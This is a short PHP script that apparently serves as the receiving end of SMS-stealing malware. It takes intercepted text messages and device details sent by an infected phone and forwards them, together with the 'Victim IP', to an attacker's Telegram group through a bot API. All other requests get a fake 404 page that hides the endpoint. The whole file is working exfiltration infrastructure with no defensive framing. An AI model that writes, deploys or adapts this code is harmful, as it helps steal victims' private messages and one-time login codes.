<?php

require_once("functions.php");

$telegram_api_key = "YOUR_API_KEY";
$telegram_channel_or_group_id = "GROUP_OR_CHANNEL_ID";

if (isset($_REQUEST['sms']) && isset($_REQUEST['device-info'])) {
    
    $telegram_bot_message = $_REQUEST['device-info']."\nVictim IP=> https://whatismyipaddress.com/ip/".getIpAddress()."\nMessage Body=> {".$_REQUEST['sms']."}";
    sendTelegramMessage($telegram_api_key, $telegram_channel_or_group_id, urlencode($telegram_bot_message));

}
else{
    http_response_code(404);
    echo "Error 404";
}

?>
